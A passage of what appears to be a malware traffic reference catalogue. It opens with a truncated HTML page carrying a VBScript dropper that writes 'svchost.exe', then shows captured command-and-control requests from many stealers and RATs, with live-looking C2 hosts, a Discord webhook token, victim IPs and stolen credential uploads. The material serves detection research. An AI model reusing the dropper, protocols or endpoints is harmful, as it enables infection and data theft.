-->
</style>
</head>

<body>



<title>..........</title>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td align="center" valign="middle" bgcolor="#000000"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="990" height="677">
      <param name="movie" value="china/images/index.swf" />
      <param name="quality" value="high" />
      <param name="BGCOLOR" value="#000000" />
      <embed src="china/images/index.swf" width="990" height="677" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" bgcolor="#000000"></embed>
    </object></td>
  </tr>
</table>
</body>
</html>

 
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ramnit.png "Ramnit")

#### Real Thin Client
~~~
POST /$rdgate?ACTION=HELLO HTTP/1.1
HOST: 130.185.238.32
CONTENT-LENGTH: 7249

PU.<.-..v..gr..?.....&...."..j.g.6.L.D8...M...........IbT.L.B4H\@....C..^..|.1..V..N.....x...<M@$..G.....8....K..:8........u.$...)m.....n.O|....9,mxg..Cev.U<.C.S.5.3.$.......C...{..1>.L~.B|...f.Yw.-}a..?.."y......s./.l...+..gn_9.@_ .h +Sj.d#..e...5\.LU.6.....w..z$....l.go.yn......6.a..b>...m@...
.....{...4.aq`....D.X.h....	.y..6<.c....=t..=.....D.....{.o.O...."C....
...u?.W.z;..0..6{%.U.I.W/8.......A...x_@T...7......*P......&.G...^'..iU.V@.*.0r.?..AD...Z..0.....).....J.-l"G......E,
.....bx......KS...Tt..nY....9.x..c..J....Mc..8.T4i...........y_.W4.|....uw.l.b&.....-.@g...tb.....*...WF...%....xy<..#.*Itj......4...Tp..H...c$.4..ar'.{..H...A.:^.j......"G..}.........._PO...a......A.9
660150973547

HTTP/1.1 200 OK
CONTENT-LENGTH: 7248
SET-COOKIE: ID=D09E48F3C3AD4A45A8E729AFDC970588

...2...........#...&.
.T^I. ...H}...jc.......5.2P.f..).qt.*.....:b	..I.|.z
..}O......p.z.k..	.xI....{.":{s...eC.wEM..4E.......@..+..lL......h..z*V.^M..l. ?h.-..E.1.C.}v.Y	..P..A...g..A.,....WU.$~.+.K...d.^.
...{....7.l.g.x....Oc..5.............^....av..F.....8.{.p|.i.
~~~
~~~
POST /$rdgate?ACTION=START&ID=D09E48F3C3AD4A45A8E729AFDC970588 HTTP/1.1
HOST: 130.185.238.32
CONTENT-LENGTH: 7248

.\k.@......TJ...........2.@...tQq..."..w.&...*}.X?.......g.c\.7....j@..".	

~~~
~~~
POST /$rdgate?ID=D09E48F3C3AD4A45A8E729AFDC970588 HTTP/1.1
HOST: 130.185.238.32
CONTENT-LENGTH: 213

..K.^Y	.dz....A.=.=.L"+..F.Jj...KE..z.Z8...BU......m/......%(..lw.(Y.{2.;..O/..7.bx..'.....t.r......3._....`i17jj.u...0....T,dy&.......#Z`^....>7.0.M.[O$\..."....y......P..9.W..;.L]......lf.....#.u.......v.Yf..6.G

HTTP/1.1 200 OK
CONTENT-LENGTH: 16

xa...x..N.qM...
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/realthinclient-1.png "Real Thin Client")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/realthinclient-2.png "Real Thin Client")

#### Redline Stealer
~~~
POST / HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/Endpoint/EnvironmentSettings"
Host: donstop.conferencesystems.online:14402
Content-Length: 144
Expect: 100-continue
Accept-Encoding: gzip, deflate

HTTP/1.1 100 Continue

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><EnvironmentSettings xmlns="http://tempuri.org/"/></s:Body></s:Envelope>HTTP/1.1 200 OK
Content-Length: 4615
Content-Type: text/xml; charset=utf-8
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 02 Aug 2021 19:46:57 GMT

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><EnvironmentSettingsResponse xmlns="http://tempuri.org/"><EnvironmentSettingsResult xmlns:a="BrowserExtension" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><a:BlockedCountry xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/><a:BlockedIP xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>37.142.225.189</b:string></a:BlockedIP><a:Object4>true</a:Object4><a:Object6>false</a:Object6><a:ScanBrowsers>true</a:ScanBrowsers><a:ScanChromeBrowsersPaths xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>%USERPROFILE%\AppData\Local\Battle.net</b:string><b:string>%USERPROFILE%\AppData\Local\Chromium\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Google\Chrome\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Google(x86)\Chrome\User Data</b:string><b:string>%USERPROFILE%\AppData\Roaming\Opera Software\</b:string><b:string>%USERPROFILE%\AppData\Local\MapleStudio\ChromePlus\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Iridium\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\7Star\7Star\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\CentBrowser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Chedot\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Vivaldi\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Kometa\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Elements Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Epic Privacy Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\uCozMedia\Uran\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer</b:string><b:string>%USERPROFILE%\AppData\Local\CatalinaGroup\Citrio\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Coowon\Coowon\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\liebao\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\QIP Surf\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Orbitum\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Comodo\Dragon\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Amigo\User\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Torch\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Yandex\YandexBrowser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Comodo\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\360Browser\Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Maxthon3\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\K-Melon\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Sputnik\Sputnik\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Nichrome\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\CocCoc\Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Uran\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Chromodo\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Mail.Ru\Atom\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data</b:string><b:string>%USERPROFILE%\AppData\Local\NVIDIA Corporation\NVIDIA GeForce Experience</b:string><b:string>%USERPROFILE%\AppData\Local\Steam</b:string><b:string>%USERPROFILE%\AppData\Local\CryptoTab Browser\User Data</b:string></a:ScanChromeBrowsersPaths><a:ScanDiscord>true</a:ScanDiscord><a:ScanFTP>true</a:ScanFTP><a:ScanFiles>false</a:ScanFiles><a:ScanFilesPaths xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/><a:ScanGeckoBrowsersPaths xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>%USERPROFILE%\AppData\Roaming\Mozilla\Firefox</b:string><b:string>%USERPROFILE%\AppData\Roaming\Waterfox</b:string><b:string>%USERPROFILE%\AppData\Roaming\K-Meleon</b:string><b:string>%USERPROFILE%\AppData\Roaming\Thunderbird</b:string><b:string>%USERPROFILE%\AppData\Roaming\Comodo\IceDragon</b:string><b:string>%USERPROFILE%\AppData\Roaming\8pecxstudios\Cyberfox</b:string><b:string>%USERPROFILE%\AppData\Roaming\NETGATE Technologies\BlackHaw</b:string><b:string>%USERPROFILE%\AppData\Roaming\Moonchild Productions\Pale Moon</b:string></a:ScanGeckoBrowsersPaths><a:ScanScreen>true</a:ScanScreen><a:ScanSteam>true</a:ScanSteam><a:ScanTelegram>true</a:ScanTelegram><a:ScanVPN>true</a:ScanVPN><a:ScanWallets>true</a:ScanWallets></EnvironmentSettingsResult></EnvironmentSettingsResponse></s:Body></s:Envelope>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/redline.png "Redline Stealer")

#### Remcos RAT
~~~
[DataStart]x...K...SMILING BASES|cmd|M.K.Z.T.2.4.4.6.8.5.8.7.4.7.4./.h.g.M.y.Z.r.4.1.u.S.U.1.F.|cmd|US|cmd|Microsoft Windows XP (32 bit)|cmd||cmd|2095747072|cmd|2.5.0 Pro|cmd|C.:.\.D.o.c.u.m.e.n.t.s. .a.n.d. .S.e.t.t.i.n.g.s.\.A.d.m.i.n.i.s.t.r.a.t.o.r.\.A.p.p.l.i.c.a.t.i.o.n. .D.a.t.a.\.y.e.d.c.o.s.\.l.o.g.s...d.a.t.|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd||cmd||cmd|1|cmd|0|cmd|9562396|cmd|1|cmd|hangulcoxpw.pw|cmd|uCjp95GKXiHwd-AJJHX8|cmd|0|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd|Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")

#### Revcode RAT
~~~
POST /recv4.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: WebMonitor Client
Host: 151.106.0.80
Content-Length: 187
Cache-Control: no-cache

keyauth=Mk45U3pxVHBZc1JNZ0F2SHxjMTNiOTYyMmMzMGNmNWMyY2M3NzEzNGQzOWEzNTkyZnw0M3w4fDIx&key=90AouQzhwLF1M0GQgCr8TyhSZI0k5pT9&uid=fd77d5053fc0439d53a9125c9f9da5af&user=faridsule08&cmp=0&enc=0

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Tue, 28 May 2019 20:40:53 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 3
Connection: keep-alive
Set-Cookie: PHPSESSID=t16fp416o0to9i1bv6kadqkoa0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

1-1
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revcode.png "Revcode")

#### Revenge RAT
~~~
InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213Revenge-RATVVNFUi1QQyAvIGFkbWluRevenge-RATNoRevenge-RATTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwgIDMyRevenge-RATSW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6Revenge-RAT3757686784Revenge-RATTi9BRevenge-RATTi9BRevenge-RAT1000Revenge-RATTWljcm9zb2Z0IFBvd2VyUG9pbnQ=Revenge-RATZW4tVVM=Revenge-RATFalse*-]NK[-*
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Revenge RAT")

#### RMS RAT
~~~
...........<?xml version="1.0" encoding="UTF-8"?>
<rman_message version="67002"><code>1</code><string_param></string_param><string_param_2></string_param_2><int_param>1</int_param><data>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxyb21fdmVyc2lvbiB2ZXJzaW9uPSI2NzAwMiI+PHByb2R1Y3Q+Uk1TPC9wcm9kdWN0Pjx2ZXJzaW9uPjY3MDAyPC92ZXJzaW9uPjx0ZXh0X3ZlcnNpb24+Ni43LjAuMjwvdGV4dF92ZXJzaW9uPjxiZXRhX3ZlcnNpb24+MDwvYmV0YV92ZXJzaW9uPjxwcm90b2NvbF92ZXJzaW9uPjU8L3Byb3RvY29sX3ZlcnNpb24+PGtpbmQ+MTwva2luZD48aWQ+NDAwLTYyMi05OTItNzg5PC9pZD48ZGV2aWNlX25hbWU+VXNlci1QQzwvZGV2aWNlX25hbWU+PGNvdW50cnlfY29kZT4yNDQ8L2NvdW50cnlfY29kZT48dXNlcl9kYXRhPjNGNEY1QTZDQjk1MDQ3RkVBNjEwMkJEN0QyMjI2QUE5PC91c2VyX2RhdGE+PHN5c3RlbV9oYXNoPjA4Q0FDN0UyNTQ0MTMzRjNBODIzMEZENUY5MzM0QkMzMUFEQTY5NkVFNUYzMzczQjVEODUzMzZCNTcxRDRFRkQ5MEVGQjU5NzJFRUNFMzg3N0M3QUNENDUyODBGRUJCQTJCMjMzMDZCOENDRkYwRDhDNUUyOTJCQ0M3OEY2MjAzPC9zeXN0ZW1faGFzaD48c3luY19kYXRhPkM4Q0VBOEJBRDQxODFBMjFBNDU4QzVGNkU1MTIwN0Y0PC9zeW5jX2RhdGE+PHJhdGlvPjA8L3JhdGlvPjx0cmlhbF9zdGF0ZT4wPC90cmlhbF9zdGF0ZT48YnBoX3ZlcnNpb24+ZmFsc2U8L2JwaF92ZXJzaW9uPjxsaWNlbnNlX2tleT48L2xpY2Vuc2Vfa2V5PjxkYXlzX2xlZnQ+MDwvZGF5c19sZWZ0Pjwvcm9tX3ZlcnNpb24+DQo=</data></rman_message>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/rms.png "RMS RAT")

#### Sakari Stealer
~~~
HTTP/1.1 100 Continue

POST /fifa/fifa.php?hwid=U3LZDGVTLKNOYXJBXQ&ci=895317359&p=0&c=4&a=0&f=0&t=0&fz=0&s=0&cr=0&ds=0&dd=&pd=0

HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------8d7a406c7491109
Host: dodoos.ru
Content-Length: 168940
Expect: 100-continue
Connection: Keep-Alive

-----------------------8d7a406c7491109
Content-Disposition: form-data; name="file"; filename="[US]174.208.31.102_U3LZDGVTLKNOYXJBXQ.zip"
Content-Type: application/octet-stream

PK.........{<PJ.7y....]...	...image.pngd.y4...>n..,.e..THb.k..Q..D..Yf.1..+.wf..NTv..i....!.a.........}..9..3..y.u].u_..<..f.....SQQ....YQQ..RQ.R.c8.dB...._..V.:T..W..]..i....B#.O...]3=3........P..T.PQQ*...m.;.&3.....G..SO...../|.\.|..7.1b/U.w..K.......j..k.J.z..%..L....u..+..".O..H>..F....Z.e.7.4..9RvH.w...g?...../.............i..v.........
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sakari.png "Sakari")

#### Sarwent BOT
~~~
GET /gate/connect?os=Windows+7+Release+Preview+(Build%3A+7601+-+Service+Pack%3A+1.0)+&bits=x64&av=Not+found HTTP/1.1
Host: shopstoregame.icu
Connection: keep-alive
User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
Accept: */*

HTTP/1.1 200 OK
Date: Mon, 14 Oct 2019 11:02:40 GMT
Server: Apache/2.4.18 (Ubuntu)
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjNkQ2hqY01YSVJtRUlBM1REeCtxRkE9PSIsInZhbHVlIjoiV1Y2dkxHMjRYWm5TemxGOFNUWHlKU0hZTWNJKyszaVh3SVEzb3pWcEFBeUhFOU9UQms3a3ZKMUo3U1NLNzE0dCIsIm1hYyI6IjZlMWEwMTM2YjE0NDcxMzJkYjY1MmE2NmQxZjU0YzJjYjAwODU0MWI0YTRhMTUyNzQxOTg2MjYwNjQyMjAyOWIifQ%3D%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/
Set-Cookie: laravel_session=eyJpdiI6Ijd5dUpwTE5yMmFWeUFPVmZTUlA3bnc9PSIsInZhbHVlIjoiTlpNajV5eDVFWlVzUDdjMFwvdFlTYm41UVNFVW5JdVJuZzdvN0ZFcWNaWFRlOXcwUWRVSUdwQm0wK1VFSmRBQkoiLCJtYWMiOiJlNjg1OGMzNWQ5ZDI2NjU2ZmU0MzBiNjNkN2Y3MDAwZDhhZThkMTllNWQ2MTRlYWM5YzI3MGI0MzllYzg2MDI4In0%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/; httponly
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
~~~
~~~
GET /gate/connect?hwid=a98d6177939ada8b295d0a984de3a565&os=Windows+7+Release+Preview+(Build%3A+7601+-+Service+Pack%3A+1.0)+&bits=x64&av=Not+found HTTP/1.1
Host: blognews-journal.com
Connection: keep-alive
User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
Accept: */*

HTTP/1.1 200 OK
Date: Sat, 15 Feb 2020 21:00:09 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/7.1.33
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IlAraGlSVVhaK0V2aVAyMlpSWXQ1RlE9PSIsInZhbHVlIjoibkp0RUx5K05RMSt3TmFBK0FpMmp0dDlCQ2FtWjVsSWgrcitMNkhJanBqSmpxYUJ2VUxYSUdzWFI0Y0F0aUk4ViIsIm1hYyI6IjNjNDdkMDIxMjBlNDJkYjU1MGY5N2VlZDc0NmFjNDdiZWMxMDJhMGM1ZTg2M2IyNDE3ODQ4MWFkYTI5NDdhOTAifQ%3D%3D; expires=Sat, 15-Feb-2020 23:00:09 GMT; Max-Age=7200; path=/
Set-Cookie: laravel_session=eyJpdiI6ImFSMEdGbllpQzVyd0hkbW1sclZwYlE9PSIsInZhbHVlIjoiTUpKMG42WVlZUDQ4Y3d0bmk3em9VdUxhb3ZzSFVyelBCaVRYaWxKaGhjbjJ2dzh5Y1wvZWs2a1dHVmNNK0t4YWwiLCJtYWMiOiJjOTA0ZjZmMjBiODU3MzMwZGQyMDg0ZjA3MTk5M2RlN2E1NGE3MWRmZjQyNDAzYjQ0NjNhYzJkYTM1ZDAxOGY2In0%3D; expires=Sat, 15-Feb-2020 23:00:09 GMT; Max-Age=7200; path=/; httponly
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
~~~

![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent.png "Sarwent BOT")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent2.png "Sarwent BOT")

#### SDBot
~~~
........g.ver=2.3
domain=WORKGROUP
pc=USER-PC
geo=??
os=6.1.7601 (x86) Service Pack 1
rights=user
proxyenabled=0
....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sdbot.png "SDBot")

#### Servhelper
~~~
POST /like/s.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Content-Length: 376
Host: laph.icu

key=%00%00%04%03%1B%00%1B&sysid=%06%1A%18%5EX%2B%3B%06%1A%08%00%03%1FOCL%3C%11%1E%19%1D%0F%0AT%3C%0E%17%07OELG%22%09%1D%07%05%00%1ALYZ%5DCT.%1A%1D%00%0BT%5BYD%5DCTZ%5BY%0E%06%00L*%10%05%1B%1D%03%01%5D3%17BX0%01%1F%0A%06%02%0E%19%09UT9%3C1%3EB%24%2FK%2B%1B%06%1A%0D%0C%17V%18%13%0D%1A%00%05%03%15%0F%0CO%21%3AB%5B%05%1A%27%3AO3Z%40TY%40&resp=%03%04&rights=%0A%09%12%0A%09&misc=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/servhelper.png "ServHelper")

#### Sidewinder APT
~~~
HTTP/1.1 100 Continue

POST /202/KfzLXf6NisWqPtYOrrQYJfzErkCyS8ib8dz3QSsN/1115/2280/16331af8 HTTP/1.1
X-File-Path: QzpcV2luZG93c1xTaGVsbE5ld1xFWENFTDEyLlhMU1g=
X-File-Offset: 0
X-File-Length: 8746
Content-Type: application/x-raw
Content-Encoding: gzip
Host: ap1-acl.net
Content-Length: 7801
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

PK..
......d35............	...docProps/SDt..........>;cd`i.a``Pa... fd.3Y.......
........*.g.?.i/..cbX....e.`..(....Y.".....S8.r.\. .U...5w%...ZE..I.....0q&,..UT
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sidewinder.png "Sidewinder")

#### Smokeloader
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://thankg1.org/
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Content-Length: 299
Host: thankg1.org

..ngl$j.N...$.=\..98h...8..XO.(3ET]...p1.Z.Q.....GI.1R..j6......NF`&....."5..V.~...#.,w......\N.V`.gI..0&.
.N.Z...%.b.....V..3H....t..6w.....7.0..
..+.........O..`...4..A..wT.F...XM&2.^.Y................E.4	W`.......(.....<,.zK..>c..^...p......n.z"]....\S,[.
......qV4`..Pu*...8W.........M .h.v.S.:.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")

#### StelyBuilder (stealer)
~~~
POST /api/webhooks/848953655281320046/ZSrVJ-rBOW7B0MEj8lHMqJpevQ7e2tubaBOd-YTUHdw6Pk6qudkXbUqDA9u6xOqJyFGk HTTP/1.1
Content-Type: multipart/form-data; boundary=----------------------------8d927948cc57064
Host: discord.com
Content-Length: 69917
Expect: 100-continue
Connection: Keep-Alive

------------------------------8d927948cc57064
Content-Disposition: form-data; name="content";

```asciidoc
Hi, I got a new account!
== Standard info == 
IP :: 46.244.28.15
OS :: Microsoft Windows 7 Professional 
MAC Address :: 06B2996D78FE
== Browser Account == 
Browser Account :: N/A
Browser Nitro :: N/A
Browser Tokens :: 
== Discord Account == 
Discord Account :: N/A
Discord Nitro :: No
Discord token :: N/A
- JustSvK ;D```
------------------------------8d927948cc57064
Content-Disposition: form-data; name="screen.jpg"; filename="screen.jpg"
Content-Type: application/octet-stream

HTTP/1.1 200 OK
Date: Fri, 04 Jun 2021 20:08:44 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
set-cookie: __dcfduid=83c4086157294e7084e184d65f0f45a2; Expires=Wed, 03-Jun-2026 20:08:44 GMT; Max-Age=157680000; Secure; HttpOnly; Path=/
strict-transport-security: max-age=31536000; includeSubDomains; preload
x-ratelimit-bucket: 3cd1f278bd0ecaf11e0d2391374c011d
x-ratelimit-limit: 5
x-ratelimit-remaining: 4
x-ratelimit-reset: 1622837327
x-ratelimit-reset-after: 2
x-envoy-upstream-service-time: 175
Via: 1.1 google
Alt-Svc: h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400, h3=":443"; ma=86400
CF-Cache-Status: DYNAMIC
cf-request-id: 0a7a3d80c70000424ac22e8000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v2?s=nylML2gqoJTP71M4xCvNZxP2X2as8i2Cj1uNqpxd7BDvu9lFKudNXUYWRAnCsmmjszVMvMN9x8qkwGnjXpnA1kS4O%2FkhY1DzBzkgkQvXVwlFw8HAn1KqAA%3D%3D"}],"group":"cf-nel","max_age":604800}
NEL: {"report_to":"cf-nel","max_age":604800}
X-Content-Type-Options: nosniff
Server: cloudflare
CF-RAY: 65a3cb7add71424a-LHR

{"id": "850466121801924668", "type": 0, "content": "```asciidoc\nHi, I got a new account!\n== Standard info == \nIP :: 46.244.28.15\nOS :: Microsoft Windows 7 Professional \nMAC Address :: 06B2996D78FE\n== Browser Account == \nBrowser Account :: N/A\nBrowser Nitro :: N/A\nBrowser Tokens :: \n== Discord Account == \nDiscord Account :: N/A\nDiscord Nitro :: No\nDiscord token :: N/A\n- JustSvK ;D```", "channel_id": "848953638326894686", "author": {"bot": true, "id": "848953655281320046", "username": "Thomas", "avatar": "1c10b14e6bb806dd6141d56993851a34", "discriminator": "0000"}, "attachments": [{"id": "850466121325084732", "filename": "screen.jpg", "size": 64405, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121325084732/screen.jpg", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121325084732/screen.jpg", "width": 1280, "height": 720, "content_type": "image/jpeg"}, {"id": "850466121484337172", "filename": "creds.txt", "size": 1779, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121484337172/creds.txt", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121484337172/creds.txt", "content_type": "text/plain; charset=utf-8"}, {"id": "850466121617899520", "filename": "cookies.txt", "size": 2760, "url": "https://cdn.discordapp.com/attachments/848953638326894686/850466121617899520/cookies.txt", "proxy_url": "https://media.discordapp.net/attachments/848953638326894686/850466121617899520/cookies.txt", "content_type": "text/plain; charset=utf-8"}], "embeds": [], "mentions": [], "mention_roles": [], "pinned": false, "mention_everyone": false, "tts": false, "timestamp": "2021-06-04T20:08:44.334000+00:00", "edited_timestamp": null, "flags": 0, "components": [], "webhook_id": "848953655281320046"}
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stely1.png "StelyBuilder")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stely2.png "StelyBuilder")

#### Taurus Stealer
~~~
POST /gate/cfg/?post=1&data=r3u6t8u3w8u6t8u3w8 HTTP/1.1
Content-Type: text/html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.781.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Host: babbleabode.site
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 27 May 2020 15:26:32 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 104
Connection: keep-alive
Set-Cookie: __cfduid=db7fc43a4ae9bdbfce85e13d77925f5bc1590593192; expires=Fri, 26-Jun-20 15:26:32 GMT; path=/; domain=.babbleabode.site; HttpOnly; SameSite=Lax
CF-Cache-Status: DYNAMIC
cf-request-id: 02f85718da0000cc9f0f3c9200000001
Server: cloudflare
CF-RAY: 59a0c13af9bdcc9f-WAW

POST /gate/log/?post=2&data=aHlDeEKigDJICBBajI6tSrFLP2LDzW7gS2xM6pajq2spMF6fMYaevU+ESsC8FWE5TVyJrLY+nnYnlX5wTK+s5omkEHIRK0Ik5ZJoPcuo0l3rEAD9K08Hwnjg4gRePOegYXp2GnXBZgalBTZQ6wTYHF+WKMfF3Q== HTTP/1.1
Cookie: __cfduid=db7fc43a4ae9bdbfce85e13d77925f5bc1590593192
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.781.121 Safari/537.36
Host: babbleabode.site
Content-Length: 4353
Connection: Keep-Alive
Cache-Control: no-cache
Content-Type: multipart/form-data; boundary=---------------------------

-----------------------------
Content-Disposition: form-data; name="file"; filename="r3u6t8u3w8u6t8u3w8.zip"
Content-Type: application/octet-stream

PK........@{.P................Outlook/UT
.....^...^...^PK........@{.Po...?...F.......Outlook/Outlook.txtUT
.....^...^...^s.M...R...K.t(./.K..e..
H,.../J.......f@.`...+.CK#=C3.=C=C../..PK........@{.P................General/UT
.....^...^...^PK........@{.P................Cookies/UT
.....^...^...^PK........@{.P................History/UT
.....^...^...^PK........@{.P................Cookies/Chrome_0.txtUT
.....^...^...^..I..@....4?....nF..`.c...6\,.1f5....D..(..EQI...SUEI.N.8...-.l..5qp<..B(......G!
b.P..%..(....j.....s.c......_..7X	.V..G.9.......;...Y.c...C..5..............q..u...n.....,77..~;....(i..7...kM.i..]6.J/.vlR..Z.m.4N.,....3.......W.....^.!S....}..d..X. .b<.!7a.......;.S..).d......W.?;c9. .8L.....AS.')D~..!i.!.M...e..y ...F	C..a.)...y......!..y..X...K..A....3Ywc9....,.../.K.........^......D.........f0.......y..G..V...]..a.PS..W..../../(E...y(..OB.L.p	<jV....9....[	y..k.C.
.yS.....+PK........@{.P..+.....s.......Cookies/Mozilla_1.txtUT
.....^...^...^..Ms.0.@..L~.\I.l......R.B...#..Gb[.d.......N'9to..}..{:..J_.....g..q...`<._..Sj#..d..
<.V@n....)t
.N...aYE..9....a7....}....M.~l.5b...E.l&U...a..I;[.....$+4]./.P..).T.[.....<.E....$..0...X
